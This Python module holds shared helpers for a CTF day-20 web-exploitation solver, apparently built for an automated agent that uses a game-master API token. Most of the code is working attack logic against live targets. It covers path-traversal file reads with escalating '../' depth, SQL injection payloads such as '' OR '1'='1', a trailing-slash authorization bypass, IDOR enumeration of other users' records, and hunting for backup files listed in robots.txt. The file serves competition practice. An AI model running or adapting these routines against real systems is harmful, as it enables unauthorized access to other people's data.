#!/usr/bin/env python3
"""Shared helpers for the day-20 web-exploitation solvers (stdlib only).

The base Homebase interpreter has no `requests`, so everything here is urllib.
Game Master client + a tiny paced HTTP client for hitting live targets, plus
per-bug recoverers reused across single/TT/mastery (mastery is cumulative over
the lane's bug types up to the challenge's day, so a mastery target can be any
earlier bug, not just the day's new one).
"""
import json
import os
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

ROOT = Path(__file__).resolve().parents[3]
GM = os.environ.get("HUNTRESS_GM_URL", "https://2026.huntress.ctf.games/").rstrip("/") + "/"
PROOF_RE = re.compile(r"proof_[0-9a-fA-F]{16,}")
DELAY = 0.8          # pacing between target requests (shared-endpoint rule)
SQLI_PAYLOADS = ["') OR ('1'='1", "%' OR '1'='1", "') OR ('1'='1'-- -", "' OR '1'='1"]


def token():
    tok = os.environ.get("HUNTRESS_GM_TOKEN")
    if not tok:
        tok = re.search(r"HUNTRESS_GM_TOKEN=(gm1\.[\w.]+)", (ROOT / "AGENTS.md").read_text())[1]
    return tok


def gm(payload=None, **query):
    url = GM + ("?" + urllib.parse.urlencode(query) if query else "")
    body = json.dumps(payload).encode() if payload is not None else None
    req = urllib.request.Request(url, data=body, headers={
        "Authorization": "Bearer " + token(), "Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=45) as r:
            return json.load(r)
    except urllib.error.HTTPError as exc:
        return {"http_status": exc.code, **json.loads(exc.read())}


def client(outdir):
    """Return a paced GET helper that saves every response under outdir."""
    outdir.mkdir(parents=True, exist_ok=True)
    jar = urllib.request.HTTPCookieProcessor()
    opener = urllib.request.build_opener(jar)
    opener.addheaders = [("User-Agent", "ctf-web-lane/1.0")]

    def get(base, path, save, data=None):
        url = base.rstrip("/") + path
        try:
            with opener.open(url, data=data, timeout=20) as r:
                body = r.read()
                status = r.status
        except urllib.error.HTTPError as exc:
            body = exc.read()
            status = exc.code
        (outdir / save).write_bytes(body)
        text = body.decode("utf-8", "replace")
        print(f"    GET {path[:80]} -> {status} {len(body)}B", file=sys.stderr)
        return status, text
    return get


# --- per-bug recoverers -----------------------------------------------------
def rec_lfi(base, get, prompt=""):
    """Path-traversal viewer: ?<param>=<pages file>. Read the mounted proof file."""
    _, root = get(base, "/", "root.html")
    # Derive the viewer endpoint + param from a runbook link (?doc=about.php).
    mm = re.search(r'href="([^"]*\.php)\?(\w+)=', root)
    endpoint, param = (mm.group(1), mm.group(2)) if mm else ("/reader.php", "doc")
    # Derive the proof file path from the challenge prompt ("mounted at <path>").
    pm = re.search(r"mounted at (/\S+)", prompt)
    target_path = pm.group(1).rstrip(".") if pm else "/run/huntress/objective.txt"
    rel = target_path.lstrip("/")
    for depth in range(1, 9):
        payload = "../" * depth + rel
        q = endpoint + "?" + urllib.parse.urlencode({param: payload})
        time.sleep(DELAY)
        _, txt = get(base, q, f"lfi_d{depth}.html")
        hit = PROOF_RE.search(txt)
        if hit:
            return hit.group(0)
    # Fallback: absolute path (some includes allow a leading slash)
    time.sleep(DELAY)
    q = endpoint + "?" + urllib.parse.urlencode({param: target_path})
    _, txt = get(base, q, "lfi_abs.html")
    hit = PROOF_RE.search(txt)
    return hit.group(0) if hit else None


def rec_admin(base, get, prompt=""):
    """Django per-route authz gap ("Administratively Speaking", day 05).

    /api/clues discloses a `feature_route`; the authorization middleware only
    guards the canonical (trailing-slash) path, so requesting the route WITHOUT
    the trailing slash walks past the gate and returns the proof in `evidence`.
    """
    _, body = get(base, "/api/clues", "clues.json")
    try:
        route = json.loads(body).get("feature_route")
    except ValueError:
        route = None
    if not route:
        return None
    route = "/" + route.strip("/")          # ensure no trailing slash
    time.sleep(DELAY)
    _, resp = get(base, route, "feature.json")
    hit = PROOF_RE.search(resp)
    return hit.group(0) if hit else None


def rec_sqli(base, get, prompt=""):
    _, root = get(base, "/", "root.html")
    m = re.search(r'<form[^>]*action=[\'"]([^\'"]+)[\'"]', root)
    action = m.group(1) if m else "/lookup"
    pm = re.search(r'<input[^>]*name=[\'"]([^\'"]+)[\'"]', root)
    param = pm.group(1) if pm else "q"
    for i, p in enumerate(SQLI_PAYLOADS):
        time.sleep(DELAY)
        _, txt = get(base, action + "?" + urllib.parse.urlencode({param: p}), f"inject_{i}.html")
        hit = PROOF_RE.search(txt)
        if hit:
            return hit.group(0)
    return None


def rec_idor(base, get, prompt=""):
    _, html = get(base, "/", "root.html")
    feed = next(iter(re.findall(r'href="(/api/[^"]+)"', html)), None)
    case_links = re.findall(r'href="(/[a-z]+/\d+)"', html)
    my_ids = {int(l.rsplit("/", 1)[1]) for l in case_links}
    api_tmpl = None
    if case_links:
        time.sleep(DELAY)
        _, pg = get(base, case_links[0], "mycase.html")
        m = re.search(r'fetch\(["\'](/api/[^"\']*?)(\d+)([^"\']*)["\']', pg)
        if m:
            api_tmpl = (m.group(1), m.group(3))
    foreign = []
    if feed:
        time.sleep(DELAY)
        _, body = get(base, feed, "feed.json")
        try:
            j = json.loads(body)
            me = j.get("current_user")
            for e in j.get("events", []):
                cid = e.get("case_id") or e.get("id")
                if cid is None:
                    continue
                if (e.get("owner") and e.get("owner") != me) or \
                   e.get("visibility") == "reference_only" or cid not in my_ids:
                    foreign.append(cid)
        except ValueError:
            pass

    def urls(cid):
        if api_tmpl:
            yield f"{api_tmpl[0]}{cid}{api_tmpl[1]}"
        for l in case_links[:1]:
            yield f"/api/{l.rsplit('/', 2)[-2]}/{cid}"
    for cid in dict.fromkeys(foreign):
        for u in dict.fromkeys(urls(cid)):
            time.sleep(DELAY)
            st, txt = get(base, u, f"obj_{cid}.json")
            if st == 200:
                hit = PROOF_RE.search(txt)
                if hit:
                    return hit.group(0)
                break
    return None


def rec_backup(base, get, prompt=""):
    _, rob = get(base, "/robots.txt", "robots.txt")
    for dd in re.findall(r"(?mi)^\s*Disallow:\s*(\S+)", rob):
        dd = "/" + dd.strip("/") + "/"
        time.sleep(DELAY)
        st, idx = get(base, dd, "index.html")
        if st != 200:
            continue
        members = re.findall(r'href="([^"]+)"', idx)
        members.sort(key=lambda h: 0 if re.search(
            r"\.(bak|old|orig|save|swp|zip|tar|gz|sql|json)(\.|$)", h, re.I) else 1)
        for h in members:
            path = h if h.startswith("/") else dd + h
            time.sleep(DELAY)
            st, txt = get(base, path, path.strip("/").replace("/", "_") or "root.html")
            if st == 200:
                hit = PROOF_RE.search(txt)
                if hit:
                    return hit.group(0)
    return None


def sniff(base, get):
    """Classify a target from its landing page -> recoverer fn."""
    _, html = get(base, "/", "root.html")
    if re.search(r'href="/api/clues"', html) or re.search(r'feature[_ ]route', html):
        return "admin", rec_admin          # must precede idor (both expose /api/)
    if re.search(r'\.php\?\w+=', html) or re.search(r'href="[^"]*reader', html):
        return "lfi", rec_lfi
    if re.search(r'<form[^>]*action', html):
        return "sqli", rec_sqli
    if re.search(r'href="/api/', html):
        return "idor", rec_idor
    return "backup", rec_backup
